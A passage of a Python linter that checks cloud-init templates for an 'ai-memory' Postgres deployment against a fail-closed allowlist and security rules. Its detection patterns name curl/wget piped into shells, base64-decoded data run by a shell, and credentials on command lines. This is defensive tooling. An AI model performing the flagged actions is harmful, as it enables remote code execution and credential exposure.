                    sval, sexp = unquote(sw)
                    if sexp:
                        out.append("expanded %s -c script %r" % (base, sw[:40]))
                    elif is_shell:
                        out.extend(companion_hits(sval, {}, depth + 1))
            elif pipe_in:
                out.append("pipe into %s (stdin is the program)" % base)
            for k, a in enumerate(args):
                if re.match(r"^\d*<<", a) or re.match(r"^\d*<\(", a) or (a == "<" and k + 1 < len(args) and args[k + 1].startswith("<(")):
                    out.append("%s fed by a here-string, heredoc or process substitution" % base)
                    break
        if base == "base64" and any(a in ("-d", "--decode", "-D") or re.match(r"^-[A-Za-z]*d", a) for a in args):
            decodes = True
        if base == "xxd" and any(a.startswith("-r") for a in args):
            decodes = True
        if base == "openssl" and "-d" in args:
            decodes = True
    for sub in subs:
        out.extend(companion_hits(sub, {}, depth + 1))
    if decodes and runs_shell:
        out.append("decoded data in a statement that runs a shell")
    return out


def flow_list(text: str):
    """Parse a YAML flow list ``[a, "b", 'c']``; None when it cannot."""
    s = text.strip()
    if not (s.startswith("[") and s.endswith("]")):
        return None
    s = s[1:-1]
    items, cur, i, n = [], "", 0, len(s)
    while i < n:
        c = s[i]
        if c == '"':
            j = i + 1
            while j < n and s[j] != '"':
                j += 2 if s[j] == "\\" else 1
            if j >= n:
                return None
            cur += s[i:j + 1]
            i = j + 1
            continue
        if c == "'":
            j = i + 1
            while j < n:
                if s[j] == "'" and s[j + 1:j + 2] == "'":
                    j += 2
                    continue
                if s[j] == "'":
                    break
                j += 1
            if j >= n:
                return None
            cur += s[i:j + 1]
            i = j + 1
            continue
        if c in "[]{}":
            return None
        if c == ",":
            items.append(cur.strip())
            cur = ""
            i += 1
            continue
        cur += c
        i += 1
    if cur.strip():
        items.append(cur.strip())
    out = []
    for it in items:
        if it.startswith('"'):
            try:
                out.append(json.loads(it))
            except ValueError:
                return None
        elif it.startswith("'"):
            out.append(it[1:-1].replace("''", "'"))
        else:
            out.append(it)
    return out


def yaml_scalar(text: str):
    s = text.strip()
    if s.startswith('"'):
        try:
            return json.loads(s)
        except ValueError:
            return None
    if s.startswith("'"):
        if not s.endswith("'") or len(s) < 2:
            return None
        return s[1:-1].replace("''", "'")
    return s


# ---------------------------------------------------------------- line model
class Line:
    """One logical line of a template."""

    __slots__ = ("ctx", "kind", "raw", "first", "last", "exempt", "block")

    def __init__(self, ctx, kind, raw, first, last, exempt=False, block=None):
        self.ctx = ctx
        self.kind = kind  # struct, unit, script, data, heredoc, shebang
        self.raw = raw  # physical lines joined with newlines
        self.first = first
        self.last = last
        self.exempt = exempt
        self.block = block

    @property
    def text(self) -> str:
        return norm(self.raw)

    @property
    def joined(self) -> str:
        return re.sub(r"\\[ \t]*\n", "", self.raw)


def decode_views(text: str):
    v = text
    for _ in range(5):
        u = urllib.parse.unquote(v)
        if u == v:
            break
        v = u
    v1 = v.lower()
    v2 = re.sub(r"[\"'\\]", "", v1)
    return v1, v2


def triggered(line: Line) -> bool:
    if line.exempt:
        return False
    # Every executable or written line is approved from the allowlist: a
    # vocabulary of risky words is a blocklist and misses a word it lacks
    # (add-apt-repository, wget2, pipx), so script and heredoc lines are always
    # triggered. The word list still decides for data blocks.
    if line.kind in ("struct", "unit", "shebang", "script", "heredoc"):
        return True
    v1, v2 = decode_views(line.joined)
    return bool(TRIGGER_RE.search(v1) or TRIGGER_RE.search(v2))


def parse_template(name: str, text: str):
    """Return (lines, hits, entries, statements). ``entries`` maps a write_files
    path to its keys; ``statements`` lists (where, text, state) for the
    companion rule."""
    text = DIRECTIVE_LINE_RE.sub("", text)
    phys = text.split("\n")
    if phys and phys[-1] == "":
        phys.pop()
    lines, hits, entries, stmts = [], [], {}, []
    top, cur_path, sq = None, None, None
    item_ind, key_ind = None, None
    i, n = 0, len(phys)
    block_no = 0
    while i < n:
        raw = phys[i]
        if not raw.strip():
            i += 1
            continue
        if raw[:len(raw) - len(raw.lstrip())].find("\t") >= 0:
            hits.append("%s:%d: tab in YAML indentation" % (name, i + 1))
        ind = len(raw) - len(raw.lstrip())
        s = raw.strip()
        if sq is not None:
            lines[-1].raw += "\n" + raw
            lines[-1].last = i + 1
            sq = scan_quotes(s, sq)
            if top in ("bootcmd", "runcmd"):
                hits.append("%s:%d: a %s item spans lines (one line per item)" % (name, i + 1, top))
            i += 1
            continue
        if s.startswith("#"):
            ctx = "top" if top is None or ind == 0 else (cur_path if top == "write_files" and cur_path else top)
            lines.append(Line(ctx, "struct", raw, i + 1, i + 1, exempt=True))
            i += 1
            continue
        if ind == 0:
            m = re.match(r"^([A-Za-z_][\w-]*):(.*)$", s)
            if m is None:
                hits.append("%s:%d: top-level line is not a 'key:' (%r)" % (name, i + 1, s[:40]))
                top = "?"
            else:
                top = m.group(1)
                if top in ("bootcmd", "runcmd") and m.group(2).strip():
                    hits.append("%s:%d: %s must be a block list" % (name, i + 1, top))
            cur_path, item_ind, key_ind = None, None, None
            lines.append(Line("top", "struct", raw, i + 1, i + 1))
            sq = scan_quotes(s, None)
            i += 1
            continue
        if top == "write_files":
            if s.startswith("- ") or s == "-":
                pm = re.match(r"^- path:[ \t]*(\S+)$", s)
                if pm is None:
                    hits.append("%s:%d: write_files entry must start with '- path: <path>'" % (name, i + 1))
                    cur_path = "?"
                else:
                    cur_path = pm.group(1)
                    if cur_path in entries:
                        hits.append("%s:%d: write_files path %s written twice" % (name, i + 1, cur_path))
                    entries[cur_path] = {}
                key_ind = ind + 2
                lines.append(Line(cur_path, "struct", raw, i + 1, i + 1))
                i += 1
                continue
            if cur_path is None:
                hits.append("%s:%d: write_files key outside an entry" % (name, i + 1))
                cur_path = "?"
            km = re.match(r"^([A-Za-z_]\w*):(.*)$", s)
            if km is None:
                hits.append("%s:%d: write_files line is neither '- path:' nor a 'key:' of the entry (%r)" % (name, i + 1, s[:40]))
            elif key_ind is not None and ind != key_ind:
                hits.append("%s:%d: write_files key at indent %d, the entry's keys are at %d" % (name, i + 1, ind, key_ind))
            if km is not None and cur_path in entries:
                entries[cur_path][km.group(1)] = km.group(2).strip()
            lines.append(Line(cur_path, "struct", raw, i + 1, i + 1))
            sq = scan_quotes(s, None)
            if km is not None and km.group(1) == "content":
                if km.group(2).strip() not in ("|", "|-", "|+"):
                    hits.append("%s:%d: write_files content must be a literal block (content: |), got %r" % (name, i + 1, km.group(2).strip()[:20]))
                    i += 1
                    continue
                j = i + 1
                while j < n and (not phys[j].strip() or len(phys[j]) - len(phys[j].lstrip()) > ind):
                    j += 1
                while j > i + 1 and not phys[j - 1].strip():
                    j -= 1
                block_no += 1
                parse_block(name, cur_path, phys, i + 1, j, lines, hits, stmts, block_no)
                i = j
                continue
            i += 1
            continue
        ctx = top or "top"
        if top in ("bootcmd", "runcmd"):
            if item_ind is None:
                item_ind = ind
            if ind != item_ind or not s.startswith("- "):
                hits.append("%s:%d: %s line is not a one-line '- ' item" % (name, i + 1, top))
            else:
                val = s[2:].strip()
                if val[:1] in ("|", ">"):
                    hits.append("%s:%d: %s item is a block scalar (one line per item)" % (name, i + 1, top))
                elif val.startswith("["):
                    items = flow_list(val)
                    if items is None:
                        hits.append("%s:%d: %s flow list cannot be parsed" % (name, i + 1, top))
                    else:
                        stmts.append(("%s:%d" % (name, i + 1), " ".join(shlex.quote(x) for x in items), {}))
                else:
                    sv = yaml_scalar(val)
                    if sv is None:
                        hits.append("%s:%d: %s item cannot be parsed" % (name, i + 1, top))
                    else:
                        stmts.append(("%s:%d" % (name, i + 1), sv, {}))
        lines.append(Line(ctx, "struct", raw, i + 1, i + 1))
        sq = scan_quotes(s, None)
        i += 1
    if sq is not None:
        hits.append("%s: a YAML quote is never closed" % name)
    return lines, hits, entries, stmts


def parse_block(name, path, phys, a, b, lines, hits, stmts, block_no):
    """Model the literal block phys[a:b] written to ``path``."""
    body = phys[a:b]
    first = next((x for x in body if x.strip()), None)
    if first is None:
        return
    bi = len(first) - len(first.lstrip())
    ded = []
    for k, x in enumerate(body):
        if x.strip() and len(x) - len(x.lstrip()) < bi:
            hits.append("%s:%d: block line indented less than its first line" % (name, a + k + 1))
        ded.append(x[bi:] if x.strip() else "")
    is_unit = "/systemd/" in path or path.endswith(UNIT_SUFFIXES) or any(x.strip() in ("[Unit]", "[Service]", "[Install]") for x in ded)
    if ded[0].startswith("#!"):
        kind = "script"
    elif is_unit:
        kind = "unit"
    else:
        kind = "data"
    k = 0
    if kind == "script":
        lines.append(Line(path, "shebang", ded[0], a + 1, a + 1, block=block_no))
        k = 1
    qs = None
    heredocs = []  # pending (delim, strip_tabs, quoted)
    stmt_buf, stmt_first = [], None
    st = {}
    m = len(ded)
    while k < m:
        x = ded[k]
        if not x.strip():
            k += 1
            continue
        if kind == "unit":
            grp = [x]
            exempt = x.lstrip()[:1] in ("#", ";")
            while not exempt and grp[-1].rstrip().endswith("\\") and k + 1 < m:
                k += 1
                grp.append(ded[k])
            uln = Line(path, "unit", "\n".join(grp), a + k - len(grp) + 2, a + k + 1, exempt=exempt, block=block_no)
            lines.append(uln)
            um = re.match(r"^\s*Exec\w*=[-@+!:|]*(.*)$", uln.joined, re.S)
            if not exempt and um is not None and um.group(1).strip():
                stmts.append(("%s:%d" % (name, uln.first), um.group(1), {}))
            k += 1
            continue
        if heredocs:
            delim, strip_tabs, quoted = heredocs[0]
            chk = x.lstrip("\t") if strip_tabs else x
            lines.append(Line(path, "heredoc", x, a + k + 1, a + k + 1, block=block_no))
            if chk == delim:
                heredocs.pop(0)
                k += 1
                continue
            stmts.append(("%s:%d" % (name, a + k + 1), x, {"data": True}))
            if not quoted:
                for sub in dq_subs(x):
                    if sub is None:
                        hits.append("%s:%d: unparsable substitution in a heredoc body" % (name, a + k + 1))
                    else:
                        stmts.append(("%s:%d" % (name, a + k + 1), sub, {}))
            k += 1
            continue
        if kind == "data":
            lines.append(Line(path, "data", x, a + k + 1, a + k + 1, block=block_no))
            st["data"] = True
            stmts.append(("%s:%d" % (name, a + k + 1), x, st))
            k += 1
            continue
        start = k
        is_comment = x.lstrip().startswith("#") and qs is None
        grp = [x]
        if not is_comment:
            while grp[-1].rstrip().endswith("\\") and k + 1 < m:
                k += 1
                grp.append(ded[k])
        ln = Line(path, "script", "\n".join(grp), a + start + 1, a + k + 1, exempt=is_comment, block=block_no)
        lines.append(ln)
        k += 1
        if is_comment:
            continue
        joined = ln.joined
        for hd in heredoc_starts(joined, qs):
            if hd == "bad":
                hits.append("%s:%d: heredoc operator whose delimiter cannot be read" % (name, ln.first))
            else:
                heredocs.append(hd)
        qs = scan_quotes(joined, qs)
        if stmt_first is None:
            stmt_first = ln.first
        stmt_buf.append(joined)
        if qs is None:
            stmts.append(("%s:%d" % (name, stmt_first), "\n".join(stmt_buf), st))
            stmt_buf, stmt_first = [], None
    if heredocs:
        hits.append("%s: heredoc %s in %s is never terminated" % (name, heredocs[0][0], path))
    if qs is not None or stmt_buf:
        hits.append("%s: a quote opened in %s is never closed" % (name, path))


# ---------------------------------------------------------------- validators
def service_homes(lines: list) -> set:
    homes = set()
    for ln in lines:
        if not re.search(r"(?<![\w-])useradd(?![\w-])", ln.joined):
            continue
        seg = re.split(r"\|\||&&|;|\|", ln.joined[ln.joined.find("useradd"):])[0]
        try:
            toks = shlex.split(seg)
        except ValueError:
            toks = seg.split()
        home, user, k = None, None, 1
        while k < len(toks):
            tk = toks[k]
            if tk in ("-d", "--home-dir", "--home"):
                home = toks[k + 1] if k + 1 < len(toks) else None
                k += 2
                continue
            if tk.startswith("--home-dir=") or tk.startswith("--home="):
                home = tk.split("=", 1)[1]
            elif tk in ("-s", "--shell", "-g", "-G", "-u", "-c", "-k", "-e", "-f", "-K", "-p", "-b", "-Z", "--gid", "--groups", "--uid", "--comment", "--skel", "--base-dir"):
                k += 2
                continue
            elif not tk.startswith("-"):
                user = tk
            k += 1
        if home:
            homes.add(home.rstrip("/"))
        elif user:
            homes.add("/home/" + user)
    return homes


def dsn_problems(dsn: str, ctx: str) -> list:
    out = []
    try:
        parts = urllib.parse.urlsplit(dsn)
    except ValueError:
        return ["postgres URL %s cannot be parsed" % redact(dsn)]
    raw_modes = re.findall(r"(?:^|[?&])sslmode=([^&#]*)", "?" + parts.query if parts.query else "")
    if not raw_modes or raw_modes[-1] != "verify-full":
        out.append("postgres URL %s: the last raw sslmode is not exactly sslmode=verify-full (#3705 floor)" % redact(dsn))
    pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    modes = [v for k, v in pairs if k == "sslmode"]
    if not modes:
        out.append("postgres URL %s has no sslmode key as sqlx reads it" % redact(dsn))
    elif modes[-1] != "verify-full":
        out.append("postgres URL %s: sqlx reads sslmode=%s (the last one, percent-decoded)" % (redact(dsn), modes[-1][:20]))
    for k, _ in pairs:
        if k.lower() == "sslmode" and k != "sslmode":
            out.append("postgres URL %s has a case-variant sslmode key %r (sqlx keys are case-sensitive)" % (redact(dsn), k))
        if k.lower() in ("password", "passfile"):
            out.append("postgres URL %s carries a %s key" % (redact(dsn), k.lower()))
        if k.lower() in ("host", "hostaddr", "port", "channel_binding"):
            out.append("postgres URL %s carries a %s query key (the URL dials the authority only, #4702/#4677)" % (redact(dsn), k.lower()))
    try:
        port = parts.port
    except ValueError:
        port = -1
    if port is not None and (port != 5432 or not re.search(r":5432$", parts.netloc)):
        out.append("postgres URL %s names a port other than a literal 5432 (no pooler, #4702)" % redact(dsn))
    netloc = parts.netloc
    if "@" in netloc and ":" in netloc.rsplit("@", 1)[0] and ctx != STORE_URL_PATH:
        out.append("postgres URL with a userinfo password outside %s" % STORE_URL_PATH)
    return out


def redact(dsn: str) -> str:
    return re.sub(r"//[^@/]*@", "//<userinfo>@", dsn)[:70]


def validate_line(ln: Line, homes: set, binaries: set) -> list:
    j = ln.joined
    v1, v2 = decode_views(j)
    out = []
    for m in DSN_RE.finditer(j):
        out.extend(dsn_problems(m.group(0), ln.ctx))
    if "allow_lax" in v1:
        out.append("lax store-url permission opt-out")
    serve_re = r"(?<![\w-])ai-memory[\"']?[\s,]+(?:[^\s,]+[\s,]+)*?[\"']?serve(?![\w-])"
    # v2 drops quotes and backslashes, so a quote- or backslash-split serve is read as serve (#4837 R6).
    if not (ln.kind == "unit" and re.match(r"[ \t]*ExecStart=", j)) and (re.search(serve_re, v1) or re.search(serve_re, v2)):
        out.append("ai-memory serve outside the unit ExecStart (serve flags are checked only on ExecStart)")
    if re.search(r"pgpassword|pgpassfile", v1):
        out.append("PGPASSWORD/PGPASSFILE")
    if re.search(r"ai_memory_store_url\s*=", v1):
        out.append("AI_MEMORY_STORE_URL= (use AI_MEMORY_STORE_URL_FILE, #4577)")
    if re.search(r"(?<![\w-])--store(?!\w)", v2):
        out.append("a --store flag fragment (the store URL reaches the daemon only through AI_MEMORY_STORE_URL_FILE, #4577/#4693)")
    for b in sorted(binaries):
        if re.search(r"(?:>|(?<![\w-])tee\s+(?:-\S+\s+)*)\s*[\"']?" + re.escape(b) + r"(?![\w.-])", j):
            out.append("a redirect or tee writes the unit binary %s (only install may place it)" % b)
    if re.search(r"--store[-_]url", v2) or re.search(r"--store[-_]url", re.sub(r"\s+", "", v2)):
        out.append("--store-url (the URL reaches the daemon only through AI_MEMORY_STORE_URL_FILE, #4577)")
    if re.search(r"(?<![\w-])password\s+'", v1):
        out.append("SQL PASSWORD literal (the role password lands on a psql argv and in the script)")
    if re.search(r"\$\{[^}]*(?:password|secret|token|passwd)[^}]*\}", v1):
        out.append("a terraform secret interpolated into user-data (readable from the instance metadata service)")
    if re.search(r"(?<![\w-])password\s*=", v2):
        out.append("password= (a credential in a world-readable line or on an argv)")
    if re.search(r"(?<![\w-])(?:curl|wget)(?![\w-])", v1):
        if re.search(r"\|\|\s*true\b", v1):
            out.append("curl/wget failure ignored with || true")
        if re.search(r"(?<!\|)\|(?!\|)&?\s*(?:sudo\s+(?:-\S+\s+)*)?(?:\S*/)?(?:sh|bash|dash|zsh|ksh|tar|python[\d.]*|perl|ruby|node|source|\.)(?![\w-])", v1):
            out.append("curl/wget piped into a shell, tar or interpreter")
    if re.search(r"(?<![\w-])tar(?![\w-])", v1) and re.search(r"(?<![\w-])(?:-[a-z]*x[a-z]*|x[a-z]*f|--extract|--get)(?![\w-])", v1) and re.search(r"\|\|\s*true\b", v1):
        out.append("tar extract failure ignored with || true")
    if re.search(r"(?<![\w-])sha(?:256|512)sum(?![\w-])", v1) and re.search(r"\|\|\s*(?:true|:)(?![\w-])", v1):
        out.append("digest check failure ignored with || true or || : (#4704)")
    if re.search(r"(?<![\w-])ssl\s*=\s*'?(?:off|false|no|0)\b", v1):
        out.append("ssl turned off for a local Postgres (#4704)")
    for hm in re.finditer(r"[\"'](hostnossl|host)\s+\S+\s+\S+\s+\S+\s+([^\"'\s]+)", v1):
        if hm.group(2) != "reject":
            out.append("pg_hba %s line that admits a login (only hostssl may admit, #4676/#4704)" % hm.group(1))
    if ln.ctx == "bootcmd" and "apt.postgresql.org.asc" in v1 and re.search(r"(?<![\w-])curl(?![\w-])", v1):
        if not re.search(r"(?<![\w-])sha256sum\s+-c(?![\w-])", v1):
            out.append("bootcmd fetches the PGDG key without a sha256sum -c pin (#4805)")
        elif not re.search(r"(?<![\w-])set\s+-\w*e|(?<![\w-])exit\s+1(?![\w-])", v1):
            out.append("bootcmd PGDG key pin cannot stop the item (no set -e, no exit 1: cc_bootcmd runs the next item anyway, #4805)")
    em = re.match(r"^\s*exec\w*=\s*([-@+!:]*)(\S+)", v1)
    if em is not None and ln.kind == "unit":
        binary = em.group(2)
        for h in homes:
            if binary.startswith(h.lower() + "/"):
                out.append("unit runs %s from inside the service home %s (the service user can substitute it)" % (binary, h))
    if ln.kind == "struct":
        if re.match(r"^\s*-?\s*(?:encoding|source|uri)\s*:", v1) or "!!binary" in v1:
            out.append("write_files encoding:/source:/uri:/!!binary hides the written bytes")
        pm = re.match(r"^\s*permissions\s*:\s*(.*)$", j)
        if pm is not None and ln.ctx == STORE_URL_PATH and pm.group(1).strip() != "'0600'":
            out.append("%s permissions must be '0600'" % STORE_URL_PATH)
    if "store-url" in v1:
        for cm in re.finditer(r"(?<![\w-])chmod\s+((?:-\S+\s+)*)(\S+)", v1):
            if cm.group(2) not in ("600", "0600"):
                out.append("chmod of the store-url file to %s (must stay 0600)" % cm.group(2))
    return out


# ---------------------------------------------------------------- user-data
def render_size_view(text: str) -> str:
    t = text.replace("$${", "\x00").replace("%%{", "\x01")
    t = re.sub(r"%\{[^}]*\}", "", t)

    def stand_in(m):
        nm = m.group(1).lower()
        return "x" * (256 if "url" in nm else 64)

    t = re.sub(r"\$\{\s*([^}]*)\}", stand_in, t)
    return t.replace("\x00", "${").replace("\x01", "%{")


def userdata_hits(name: str, scope: str, text: str, maintf) -> list:
    if scope not in USER_DATA_LIMITS:
        return ["FAULT:%s: no user-data limit known for scope %r" % (name, scope)]
    limit = USER_DATA_LIMITS[scope]
    rendered = render_size_view(text).encode("utf-8")
    if len(rendered) <= limit:
        return []
    tpl = posixpath.basename(name)
    want = re.compile(r"user_data_base64\s*=\s*base64gzip\(templatefile\(\"\$\{path\.module\}/" + re.escape(tpl) + "\"")
    if maintf is None or not want.search(maintf):
        return ["%s: rendered user-data is %d bytes, over the %d-byte limit of %s, and main.tf does not pass it through user_data_base64 = base64gzip(...) (#4703)" % (name, len(rendered), limit, scope)]
    gz = len(gzip.compress(rendered, mtime=0))
    if gz > limit:
        return ["%s: gzip of the rendered user-data is %d bytes, over the %d-byte limit (#4703)" % (name, gz, limit)]
    return []


# ---------------------------------------------------------------- allowlist
def load_entries(text: str, pending: bool, faults: list, label: str) -> list:
    """Parse allowlist text into (scope, issue, ctx, line, file_lineno)."""
    out = []
    for no, raw in enumerate(text.splitlines(), 1):
        if not raw.strip() or raw.startswith("#"):
            continue
        parts = raw.split(" | ", 2)
        if len(parts) != 3 or not parts[1].strip() or not parts[2].strip():
            faults.append("%s:%d: malformed entry (want '<scope> | <context> | <line>')" % (label, no))
            continue
        head, ctx, line = parts[0], parts[1], parts[2]
        issue = None
        if pending:
            hm = re.match(r"^(\S+) (#\d+)$", head)
            if hm is None:
                faults.append("%s:%d: malformed pending head %r (want '<scope> #<issue>')" % (label, no, head))
                continue
            head, issue = hm.group(1), hm.group(2)
        if head not in SCOPES:
            faults.append("%s:%d: unknown scope %r" % (label, no, head))
            continue
        if ctx != ctx.strip() or " " in ctx:
            faults.append("%s:%d: context %r is not one word" % (label, no, ctx))
            continue
        if line != norm(line):
            faults.append("%s:%d: line is not whitespace-normalised" % (label, no))
            continue
        out.append((head, issue, ctx, line, no))
    return out


def tf_regions(text: str) -> list:
    """Each Terraform directive region (opener .. matching end, or a lone
    directive line) as one whitespace-normalised text, in file order."""
    out, cur, depth = [], [], 0
    for raw in text.split("\n"):
        is_dir = DIRECTIVE_LINE_RE.match(raw) is not None
        if depth == 0 and not is_dir:
            continue
        cur.append(raw)
        if is_dir and TF_OPEN_RE.match(raw):
            depth += 1
        elif is_dir and TF_CLOSE_RE.match(raw):
            depth -= 1
        if depth <= 0:
            out.append(norm(" ".join(cur)))
            cur, depth = [], 0
    if cur:
        out.append(norm(" ".join(cur)))
    return out


def scope_of(name: str) -> str:
    return posixpath.basename(posixpath.dirname(name))


def tf_render(text: str) -> str:
    """What bash sees after terraform renders the template: ``$${`` is a
    literal ``${``, ``%%{`` a literal ``%{``, a ``%{ }`` directive vanishes and
    each ``${expr}`` becomes an operator-supplied value (a plain word here)."""
    t = text.replace("$${", "\x00").replace("%%{", "\x01")
    t = re.sub(r"%\{[^}]*\}", "", t)
    t = re.sub(r"\$\{[^}]*\}", "TFVALUE", t)
    return t.replace("\x00", "${").replace("\x01", "%{")


def tf_region_spans(text: str) -> list:
    """(first, last) physical line index of each region tf_regions returns, same order."""
    out, start, depth = [], None, 0
    for i, raw in enumerate(text.split("\n")):
        is_dir = DIRECTIVE_LINE_RE.match(raw) is not None
        if depth == 0 and not is_dir:
            continue
        if start is None:
            start = i
        if is_dir and TF_OPEN_RE.match(raw):
            depth += 1
        elif is_dir and TF_CLOSE_RE.match(raw):
            depth -= 1
        if depth <= 0:
            out.append((start, i))
            start, depth = None, 0
    if start is not None:
        out.append((start, len(text.split("\n")) - 1))
    return out


def analyse(name: str, text: str, cache: dict):
    key = (name, text)
    if key not in cache:
        lines, hits, entries, stmts = parse_template(name, text)
        comp = []
        for where, stmt, st in stmts:
            for why in companion_hits(tf_render(stmt), st):
                comp.append("%s: companion rule: %s" % (where, why))
        homes = service_homes(lines)
        trig = [ln for ln in lines if triggered(ln)]
        cache[key] = (lines, hits + comp, entries, trig, homes)
    return cache[key]


def run_scan(templates: dict, maintfs: dict, allow_text: str, pending_text: str, known: set,
             autolist: bool = False, extra=(), cache=None):
    """Scan templates (name -> text). Returns (hits, faults, stats)."""
    cache = {} if cache is None else cache
    faults, hits = [], []
    if len(templates) < 2:
        faults.append("expected at least 2 templates, found %d" % len(templates))
    scopes = {}
    for nm in templates:
        sc = scope_of(nm)
        if sc in scopes:
            faults.append("two templates in one directory: %s and %s" % (scopes[sc], nm))
        scopes[sc] = nm
    allow = load_entries(allow_text, False, faults, "allow")
    pend = load_entries(pending_text, True, faults, "pending")
    if not allow:
        faults.append("allowlist is empty (fail closed)")
    seen = {}
    for e in allow + pend:
        k = (e[0], e[2], e[3])
        clash = [x for x in ((k,) + tuple((sc, e[2], e[3]) for sc in SCOPES if (sc == "both") != (e[0] == "both"))) if x in seen]
        if clash and (clash[0] != k or e[1] or seen[k].startswith("pending")):
            faults.append("duplicate entry %s | %s | %s (also at %s)" % (e[0], e[2], e[3][:50], seen[clash[0]]))
        seen[k] = "%s:%d" % ("pending" if e[1] else "allow", e[4])
    approved = {(e[0], e[2], e[3]) for e in allow}
    pending = {(e[0], e[2], e[3]) for e in pend}
    approved |= {(s, c, t) for s, c, t in extra}
    expected = {}
    for e in allow:
        for sc in (sorted(scopes) if e[0] == "both" else [e[0]]):
            expected.setdefault((sc, e[2]), []).append(e[3])
    actual = {}
    used = {}
    ntrig = 0
    for nm, text in sorted(templates.items()):
        sc = scope_of(nm)
        hits.extend(rules_1_to_4(nm, text, known))
        for u in userdata_hits(nm, sc, text, maintfs.get(sc)):
            (faults if u.startswith("FAULT:") else hits).append(u[6:] if u.startswith("FAULT:") else u)
        lines, phits, entries, trig, homes = analyse(nm, text, cache)
        binaries = {m.group(1) for m in (re.match(r"^\s*Exec\w*=\s*[-@+!:]*(/\S+)", x.joined) for x in lines if x.kind == "unit") if m}
        hits.extend(phits)
        live = [x.joined for x in lines if not x.exempt]
        if any("pg_hba" in x for x in live):
            if not any(re.search(r"[\"']ssl = on[\"']", x) for x in live):
                hits.append("%s: writes pg_hba without a live \"ssl = on\" line (#4704)" % nm)
            # Position, not presence (#4676/#4784): the rejects protect only as arguments of
            # ONE printf whose output is written AHEAD of the packaged lines (first match
            # wins), in the pinned line order ending with a mv over $HBA, not opened inside a
            # compound command, and with no other live line touching pg_hba. Comparisons are
            # whitespace-normalised; every message names the pin it compares against.
            lv = [norm(x.joined) for x in lines if not x.exempt]
            heads = [i for i, x in enumerate(lv) if HBA_PRINTF_RE.match(x) and i + 1 < len(lv) and lv[i + 1] == HBA_CAT]
            if len(heads) != 1:
                hits.append("%s: %d printf line(s) are followed by `%s`; exactly one must write the hostnossl rejects ahead of the packaged pg_hba lines (%s) (#4676/#4784)" % (nm, len(heads), HBA_CAT, HBA_PIN))
            else:
                h = heads[0]
                for needle, why in (('"hostnossl all all all reject"', ""),
                                    ('"hostnossl replication all all reject"', ": `all` does not match the replication pseudo-database")):
                    if needle not in lv[h]:
                        hits.append("%s: the printf written ahead of the packaged pg_hba lines lacks %s%s (#4676)" % (nm, needle, why))
                got = lv[max(h - 2, 0):h] + lv[h + 1:h + 6]
                if got != HBA_ORDER:
                    hits.append("%s: the pg_hba write differs from %s line for line: expected %s around the printf, found %s (#4784)" % (nm, HBA_PIN, " | ".join(HBA_ORDER), " | ".join(x[:60] for x in got)))
                prev = lv[h - 3] if h >= 3 else ""
                if HBA_OPENER_RE.search(prev):
                    hits.append("%s: the pg_hba write is inside the compound command opened by `%s` (#4784)" % (nm, prev[:60]))
            for x in lv:
                if ("$HBA" in x or "pg_hba.conf" in x) and x not in HBA_SHAPE and not (len(heads) == 1 and x == lv[heads[0]]):
                    hits.append("%s: pg_hba touched outside %s: %s (#4784)" % (nm, HBA_PIN, x[:80]))
        if not trig:
            faults.append("%s: zero triggered lines (fail closed)" % nm)
        ntrig += len(trig)
        sp = entries.get(STORE_URL_PATH)
        if sp is not None and sp.get("permissions") != "'0600'":
            hits.append("%s: %s has no permissions: '0600'" % (nm, STORE_URL_PATH))
        for reg in tf_regions(text):
            actual.setdefault((sc, "tf-region"), []).append(reg)
        for ln in trig:
            keys = [(sc, ln.ctx, ln.text), ("both", ln.ctx, ln.text)]
            if not any(k in pending for k in keys):
                actual.setdefault((sc, ln.ctx), []).append(ln.text)
            hit_a = next((k for k in keys if k in approved), None)
            hit_p = next((k for k in keys if k in pending), None)
            if hit_a is None and hit_p is None:
                if autolist:
                    approved.add(keys[0])
                    hit_a = keys[0]
                else:
                    hits.append("%s:%d: line not in the allowlist: %s | %s | %s" % (nm, ln.first, sc, ln.ctx, ln.text[:160]))
                    continue
            k = hit_a or hit_p
            used.setdefault(k, set()).add(sc)
            if hit_a is not None:
                for why in validate_line(ln, homes, binaries):
                    hits.append("%s:%d: %s" % (nm, ln.first, why))
    for e in pend:
        k = (e[0], e[2], e[3])
        need = set(scopes) if e[0] == "both" else {e[0]}
        got = used.get(k, set())
        if not need <= got:
            what = "pending" if e[1] else "allow"
            hits.append("%s:%d: stale entry (matches nothing in %s): %s | %s" % (what, e[4], ",".join(sorted(need - got)), e[2], e[3][:80]))
    for key in sorted(set(expected) | set(actual)):
        if key[0] not in scopes or autolist:
            continue
        want, got = expected.get(key, []), actual.get(key, [])
        if want != got:
            k = next((i for i, (x, y) in enumerate(zip(want, got)) if x != y), min(len(want), len(got)))
            hits.append("%s | %s: triggered lines differ from the allowlist order at item %d (allow %d, template %d): allow=%r template=%r"
                        % (key[0], key[1], k + 1, len(want), len(got), (want[k:k + 1] or [""])[0][:70], (got[k:k + 1] or [""])[0][:70]))
    stats = {"templates": len(templates), "allow": len(allow), "pending": len(pend), "triggered": ntrig}
    return hits, faults, stats


def list_triggers(templates: dict, cache: dict) -> list:
    out = []
    for nm, text in sorted(templates.items()):
        lines, _, _, trig, _ = analyse(nm, text, cache)
        for ln in trig:
            out.append("%s | %s | %s" % (scope_of(nm), ln.ctx, ln.text))
    return out


def load_repo():
    templates = {}
    for p in sorted(ROOT.glob(TEMPLATE_GLOB)):
        templates[str(p.relative_to(ROOT))] = p.read_text(encoding="utf-8")
    maintfs = {}
    for nm in templates:
        mt = ROOT / posixpath.dirname(nm) / "main.tf"
        if mt.is_file():
            maintfs[scope_of(nm)] = mt.read_text(encoding="utf-8")
    allow = ALLOW_FILE.read_text(encoding="utf-8") if ALLOW_FILE.is_file() else ""
    pend = PENDING_FILE.read_text(encoding="utf-8") if PENDING_FILE.is_file() else ""
    return templates, maintfs, allow, pend


def build_parser() -> argparse.ArgumentParser:
    ap = argparse.ArgumentParser(description="#4616/#4657 cloud-init memory templates: fail-closed token allowlist")
    g = ap.add_mutually_exclusive_group()
    g.add_argument("--self-test", action="store_true", help="prove the rules are red on probes and green on clean lines")
    g.add_argument("--list-triggers", action="store_true", help="print every triggered line as an allowlist entry")
    return ap


# ---------------------------------------------------------------- self-test
# Built by concatenation so this file carries no literal flag-plus-DSN (#4577 gate).
SU = "--store-" + "url"
PG = "postgres" + "://"
PW = "ProbePlaceholder1"
BIN = "/usr/local/lib/ai-memory/bin/ai-memory"
PROV_PATH = "/usr/local/sbin/ai-memory-provision.sh"
